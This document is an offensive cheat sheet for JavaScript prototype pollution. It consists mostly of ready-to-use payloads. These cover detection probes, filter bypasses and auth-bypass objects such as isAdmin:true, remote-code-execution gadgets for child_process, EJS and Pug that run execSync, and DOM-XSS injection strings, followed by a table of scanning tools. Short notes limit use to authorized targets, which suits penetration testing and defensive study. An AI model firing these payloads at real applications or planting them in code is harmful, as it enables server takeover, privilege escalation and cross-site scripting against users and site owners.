# Prototype Pollution — Attack Arsenal

**Author:** x8bitranjit
Payloads, the gadget catalog, and tools. Authorized targets only. **Server-side pollution is global + persistent** — benign markers, no prod DoS.

---

## 0. The three roots (every payload uses one)

```
__proto__                     # direct
constructor.prototype         # bypasses __proto__ key filters
__proto__.__proto__           # via arrays/nested edge cases
```

## 1. Detection payloads

### Client-side (URL / hash / JSON), confirm in console
```
?__proto__[polluted]=yes
?__proto__.polluted=yes
?constructor[prototype][polluted]=yes
#__proto__[polluted]=yes
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
--- console ---
Object.prototype.polluted     // "yes"  => POLLUTED
({}).polluted                 // "yes"
```

### Server-side (SSPP) blind oracles — send, then re-request and diff
```jsonc
{"__proto__":{"json spaces":10}}                        // Express: later JSON responses indent by 10  (BEST oracle)
{"__proto__":{"status":510}}                            // later response status = 510
{"__proto__":{"exposedHeaders":["x8bit"]}}              // Access-Control-Expose-Headers: x8bit
{"__proto__":{"content-type":"text/html; charset=x8bit"}}
{"__proto__":{"parameterLimit":1}}                      // multi-param requests now 400/500
{"__proto__":{"allowDots":true}}                        // qs parsing behavior flips
{"__proto__":{"0":"x8bit","1":"y"}}                     // array-index pollution edge cases
```
Query-string form of the same (for GET/parser sources):
```
?__proto__[json spaces]=10
?__proto__%5Bstatus%5D=510
```

## 2. Filter bypasses
```
constructor[prototype][x]=y            // when __proto__ is blocked
__proto__[__proto__][x]=y
{"__pro__proto__to__":{...}}           // some naive strip-once filters -> "__proto__"
%5f%5fproto%5f%5f                      // URL-encoded __proto__
{"constructor":{"prototype":{"x":"y"}}}
// JSON key with unicode / duplicate keys depending on parser
```

## 3. Auth / logic bypass (no gadget)
```jsonc
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"isAuthenticated":true}}
{"__proto__":{"verified":true,"premium":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

## 4. Server-side RCE gadgets (match to the target's stack)

### child_process (spawn/exec/fork options fall through to the prototype)
```jsonc
{"__proto__":{"shell":"node","argv0":"console.log(require('child_process').execSync('id').toString())//"}}
{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process')..."}}}
{"__proto__":{"env":{"NODE_OPTIONS":"--inspect=... "}}}
// reliable: pollute NODE_OPTIONS -> --require=<file you control>  (pair with FileUpload / /proc)
{"__proto__":{"NODE_OPTIONS":"--require=/tmp/evil.js"}}
```

### EJS (template options)
```jsonc
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}
{"__proto__":{"escapeFunction":"1;return process.mainModule.require('child_process').execSync('id')","client":true,"compileDebug":true}}
{"__proto__":{"localsName":"x;process.mainModule.require('child_process').execSync('id');//x"}}
```

### Pug / Jade
```jsonc
{"__proto__":{"compileDebug":true,"self":true,"line":"process.mainModule.require('child_process').execSync('id')"}}
{"__proto__":{"block":{"type":"Text","val":"...","line":"..."}}}
```

### Handlebars / Nunjucks / doT / Lodash template
```jsonc
{"__proto__":{"...engine-specific compile option..."}}    // see PortSwigger server-side PP gadget list
```

### Other documented gadgets
```
nodemailer (sendmail path), ansi-html, undici/proxy (BaseUrl), vm2 escapes,
require-cache poisoning, mongoose 'schema' options, express 'view options'/'view engine'
```

## 5. Client-side DOM-XSS gadgets (pollute a config prop a library reads into a sink)
```
?__proto__[src]=data:,alert(document.domain)            // -> script.src / img.src
?__proto__[html]=<img src=x onerror=alert(document.domain)>   // -> innerHTML
?__proto__[srcdoc]=<script>alert(document.domain)</script>    // -> iframe.srcdoc
?__proto__[url]=javascript:alert(document.domain)             // -> location / a.href
?__proto__[template]=<img src=x onerror=alert(1)>             // -> framework template
?__proto__[data]=...  ?__proto__[content]=...  ?__proto__[value]=...
```
Known libs with gadgets: **jQuery** (`$.extend`, `htmlPrefilter`, `$(html)`), **Google Analytics/gtag**, **Segment analytics.js**, **Closure**, **Wistia**, **AdobeDTM / Adobe Launch**, **sanitize-html/DOMPurify configs**, **Knockout**, **Sprintf**. Identify loaded scripts, then use the matching gadget from PortSwigger's gadget catalog.

## 6. Tools

| Tool | Use |
|------|-----|
| **DOM Invader** (Burp built-in browser) | Client-side PP: auto source discovery **and** gadget scanning — the primary client tool |
| **Burp Suite** (Repeater) | Server-side SSPP oracle testing; JSON/query pollution + re-request diff |
| **`poc/pp_probe.py`** | Control-baselined SSPP oracle detector (`json spaces`/`status`/`exposedHeaders`/charset) |
| **`poc/pp_payloads.py`** | Generate the full payload matrix (URL/JSON/bracket/dot × `__proto__`/`constructor`) for a prop=value |
| **ppmap** | Client + server PP scanner (confirm manually — noisy) |
| **ppfuzz** (Rust) | Fast client-side PP source fuzzer |
| **protofuzz / PPScan** | Additional scanners |
| **Node REPL / local app** | Reproduce a gadget locally to understand the sink before firing on target |
| **Interactsh / OOB** | Blind server-side RCE confirmation (gadget → callback) |

## 7. Server-side detection quick-flow (pp_probe)
```
1. baseline a JSON endpoint (record indentation/status/headers)
2. POST {"__proto__":{"json spaces":10}}  to a merge/set source
3. re-fetch the JSON endpoint -> indented?  => SSPP confirmed
4. match a gadget (child_process/EJS/Pug) from the target's deps -> RCE
5. NOTE: pollution persists until app restart; use benign markers; no prod DoS
```

> Prove **global** pollution (fresh object / oracle flip) **and** fire a gadget. Benign markers only, one RCE proof then STOP,
> never a prod-DoS property, deliver client PoCs to your own test victim, redact secrets. Authorized targets only.
